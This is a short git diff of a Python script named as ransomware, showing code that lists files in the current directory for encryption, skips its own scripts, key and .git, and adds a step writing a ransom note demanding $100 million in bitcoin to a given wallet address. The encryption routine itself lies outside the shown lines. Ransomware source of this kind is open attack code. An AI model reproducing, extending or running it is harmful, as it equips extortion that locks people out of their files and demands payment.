@@ -20,14 +20,17 @@ for file in os.listdir():
 print(files)'''
 
 for file in os.listdir():
-    if file== "ransomewareEncoding.py"  or file=="ransomewareDecrypting.py" or file=="encryption.key":
+    if file== "ransomewareEncoding.py"  or file=="ransomewareDecrypting.py" or file=="encryption.key" or file=="READ_THIS.txt" or file==".git":
         continue
     if os.path.isdir(file):
         continue
     files.append(file)
-print(files)
 
 enckey="encryption.key"
+
+note="All your files are encrypted if you dont want to loose your data then pay $100 million in bitcoins to this address \nBitcoin address: 17hAnwKbzRKQURS52Pz4bnVXPLLenLgRnu"
+with open ("READ_THIS.txt", 'w') as ransomNote:
+    ransomNote.write(note)
 
 if os.path.exists(enckey):
         with open(enckey, "rb") as f:
